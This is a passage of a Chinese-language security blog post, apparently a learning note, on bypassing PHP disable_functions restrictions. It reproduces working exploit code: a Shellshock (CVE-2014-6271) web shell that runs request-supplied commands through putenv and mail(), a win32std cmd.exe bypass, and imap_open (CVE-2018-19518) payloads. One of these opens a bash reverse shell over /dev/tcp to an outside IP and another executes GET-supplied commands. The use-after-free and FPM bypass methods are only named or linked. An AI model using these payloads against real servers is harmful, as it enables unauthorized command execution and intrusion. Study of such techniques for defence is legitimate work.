+<li>▲ 本实验是通过mail()函数去加载so文件的，但并不只剩单单mail()函数一个，此链接<a href="https://www.anquanke.com/post/id/197745#h3-11" target="_blank" rel="noopener">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a> &amp;&amp; <a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a> 介绍到了更多fuzz内部系统调用的函数的原理以及脚本</li>
+</ul>
+<h3 id="0X03-PHP-5-x-Shellshock-Exploit-bypass-disable-functions"><a href="#0X03-PHP-5-x-Shellshock-Exploit-bypass-disable-functions" class="headerlink" title="0X03 PHP 5.x Shellshock Exploit (bypass disable_functions)"></a>0X03 PHP 5.x Shellshock Exploit (bypass disable_functions)</h3><h5 id="影响版本：PHP-lt-5-6-2-–-‘Shellshock’-Safe-Mode-Disable-Functions-Bypass-Command-Injection"><a href="#影响版本：PHP-lt-5-6-2-–-‘Shellshock’-Safe-Mode-Disable-Functions-Bypass-Command-Injection" class="headerlink" title="影响版本：PHP &lt; 5.6.2 – ‘Shellshock’ Safe Mode / Disable Functions Bypass / Command Injection"></a>影响版本：PHP &lt; 5.6.2 – ‘Shellshock’ Safe Mode / Disable Functions Bypass / Command Injection</h5><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><ul>
+<li>Linux Web Server一般可以提供CGI接口，允许远程执行Bash命令</li>
+<li>对于HTTP头部，CGI脚本解析器会将其当作环境变量，调用bash的env相关函数设置到临时环境变量中</li>
+<li>HTTP协议允许发送任意客户端自定义的HTTP头部</li>
+<li>▲ 这样就产生了一个完整的可供Bash命令注入的场景，客户端故意发送构造好的带攻击命令的HTTP头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部里面的命令。并且还会将结果一并返回给客户端</li>
+</ul>
+<h5 id="exploit-db上的脚本-—-破壳漏洞"><a href="#exploit-db上的脚本-—-破壳漏洞" class="headerlink" title="exploit-db上的脚本  —  破壳漏洞"></a><a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">exploit-db上的脚本</a>  —  破壳漏洞</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"Disabled functions: "</span>.ini_get(<span class="string">'disable_functions'</span>).<span class="string">"n"</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">     $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>);</span><br><span class="line">     putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"Not vuln (not bash)"</span>;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>▲ 2020.08.25 本实验因环境缺乏，暂无进行实验</li>
+</ul>
+<h3 id="0X04-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions"><a href="#0X04-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions" class="headerlink" title="0X04 PHP 5.2.3 win32std extension safe_mode and bypass disable_functions"></a>0X04 PHP 5.2.3 win32std extension safe_mode and bypass disable_functions</h3><ul>
+<li>▲ 脚本偏老，适用于XP系列的系统</li>
+</ul>
+<p><a href="https://www.exploit-db.com/exploits/4218" target="_blank" rel="noopener">exploit-db上的脚本</a> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//author: shinnai</span></span><br><span class="line"><span class="comment">//mail: shinnai[at]autistici[dot]org</span></span><br><span class="line"><span class="comment">//site: http://shinnai.altervista.org</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Thanks to rgod for all his precious advises :)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//I set php.ini in this way:</span></span><br><span class="line"><span class="comment">//safe_mode = On</span></span><br><span class="line"><span class="comment">//disable_functions = system</span></span><br><span class="line"><span class="comment">//if you launch the exploit from the cli, cmd.exe will be wxecuted</span></span><br><span class="line"><span class="comment">//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">"win32std"</span>)) <span class="keyword">die</span>(<span class="string">"win32std extension required!"</span>);</span><br><span class="line">system(<span class="string">"cmd.exe"</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">"..\..\..\..\windows\system32\cmd.exe"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>▲ 2020.08.25 本实验因环境缺乏，暂无进行实验</p>
+<h3 id="0X05-PHP-FPM-FastCGI-bypass-disable-function"><a href="#0X05-PHP-FPM-FastCGI-bypass-disable-function" class="headerlink" title="0X05 PHP-FPM/FastCGI bypass disable_function"></a>0X05 PHP-FPM/FastCGI bypass disable_function</h3><ul>
+<li>▲ 基于PHP-FPM的未授权范围漏洞，可自定义任意代码执行、</li>
+<li>前提<ul>
+<li>tcp监听方式，监听方式为0.0.0.0:9000</li>
+<li>php结合的方式为fpm/FastCGI</li>
+</ul>
+</li>
+<li>构造P牛的脚本 <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">fpm.py兼容py3和py2</a></li>
+</ul>
+<p><img src="/images/php-about/disable_function/php-fpm-bypass.png" alt="php-fpm-bypass"></p>
+<h3 id="0X06-PHP-imap-open-RCE漏洞（CVE-2018-19518）"><a href="#0X06-PHP-imap-open-RCE漏洞（CVE-2018-19518）" class="headerlink" title="0X06 PHP imap_open RCE漏洞（CVE-2018-19518）"></a>0X06 PHP imap_open RCE漏洞（CVE-2018-19518）</h3><h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
+<li><p>▲ 非默认安装的组件</p>
+</li>
+<li><p>在没有禁用enable_insecure_rsh选项的条件下，用户通过传入mailbox参数可导致rce</p>
+</li>
+<li><p>该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令</p>
+</li>
+<li><p>反弹shell payload</p>
+<ul>
+<li>▲ 2020.08.29 脚本修改后也无法进行反弹</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.67.153/7777 0&gt;&amp;1"</span>;</span><br><span class="line">$base64 = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t"</span>.$base64.<span class="string">"|base64\t-d|sh&#125;"</span>;</span><br><span class="line">@imap_open(<span class="string">"&#123;"</span>.$server.<span class="string">"&#125;:143/imap&#125;INBOX"</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码执行payload</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'imap_open'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no imap_open function!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t"</span> . base64_encode($_GET[<span class="string">'cmd'</span>] . <span class="string">"&gt;/tmp/cmd_result"</span>) . <span class="string">"|base64\t-d|sh&#125;"</span>;</span><br><span class="line"><span class="comment">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . "&gt;/tmp/cmd_result") . '|base64$IFS$()-d|sh&#125;';</span></span><br><span class="line">imap_open(<span class="string">'&#123;'</span> . $server . <span class="string">':143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>); <span class="comment">// or var_dump("\n\nError: ".imap_last_error());</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/tmp/cmd_result"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php-about/disable_function/imap-code-execution.png" alt="imap-code-execution"></p>
+<h3 id="0X07-利用PHP-bug-Bypass-disable-function"><a href="#0X07-利用PHP-bug-Bypass-disable-function" class="headerlink" title="0X07 利用PHP bug Bypass disable_function"></a>0X07 利用PHP bug Bypass disable_function</h3><ul>
+<li>Exploit：<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">mmor1师傅的exploits</a></li>
+<li>利用三个 PHP 历史漏洞来绕过 disable_functions</li>
+</ul>
+<h5 id="Use-after-free-with-json-serializer"><a href="#Use-after-free-with-json-serializer" class="headerlink" title="Use after free with json serializer"></a>Use after free with json serializer</h5><ul>
+<li>参考链接：<a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77843</a></li>
+<li>适用目标（*nix系统）<ul>
+<li>7.1 – all versions to date</li>
+<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
+<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
+</ul>
+</li>
+<li>▲ 2020.08.29 因实验环境过高，暂无进行实验</li>
+</ul>
+<h5 id="Use-after-free-in-GC-with-Certain-Destructors"><a href="#Use-after-free-in-GC-with-Certain-Destructors" class="headerlink" title="Use after free in GC with Certain Destructors"></a>Use after free in GC with Certain Destructors</h5><ul>
+<li>参考链接：<a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72530</a></li>
+<li>适用目标（*nix系统）<ul>
+<li>7.0 – all versions to date</li>
+<li>7.1 – all versions to date</li>
+<li>7.2 – all versions to date</li>
+<li>7.3 – all versions to date</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/php-about/disable_function/php-gc-bypass.png" alt="php-gc-bypass"></p>
+<h5 id="Use-after-free-when-accessing-already-destructed-backtrace-arguments"><a href="#Use-after-free-when-accessing-already-destructed-backtrace-arguments" class="headerlink" title="Use-after-free when accessing already destructed backtrace arguments"></a><strong>Use-after-free when accessing already destructed backtrace arguments</strong></h5><ul>
+<li>参考链接：<a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=76047</a></li>
+<li>适用目标（*nix系统）<ul>
+<li>7.0 – all versions to date</li>
+<li>7.1 – all versions to date</li>
+<li>7.2 – all versions to date</li>
+<li>7.3 – all versions to date</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/php-about/disable_function/php-backtrace-bypass.png" alt="php-backtrace-bypass"></p>
+<h3 id="0X08-其他利用方法"><a href="#0X08-其他利用方法" class="headerlink" title="0X08 其他利用方法"></a>0X08 其他利用方法</h3><ul>
+<li>FFI绕过disable_function</li>
+<li>Apache mod_cgi 修改.htaccess绕过限制</li>
+<li>dl()函数绕过disable_function限制</li>
+</ul>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a href="https://xz.aliyun.com/t/5320#toc-2" target="_blank" rel="noopener">PHP Webshell下绕过disable_function的方法</a></li>
+<li><a href="https://blog.csdn.net/qq_41107295/article/details/98462891" target="_blank" rel="noopener">PHP绕过disable_function限制</a></li>
+<li><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></li>
+<li><a href="https://www.anquanke.com/post/id/197745#h3-11" target="_blank" rel="noopener">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a></li>
+<li><a href="https://blog.csdn.net/fish43237/article/details/39609031" target="_blank" rel="noopener">ShellShock（破壳漏洞）的简单分析</a></li>
+<li><a href="https://evi1.cn/post/bypass_disable_func/" target="_blank" rel="noopener">Bypass disable_functions 学习笔记</a></li>
+<li><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">Webshell下命令执行限制及绕过方法</a></li>
+</ul>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/08/30/redis_unauthorized_access/">
+        <span class="next-text nav-default">Redis未授权访问</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2019 -
+    
+    2020
+    <span class="footer-author">Tomas.</span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
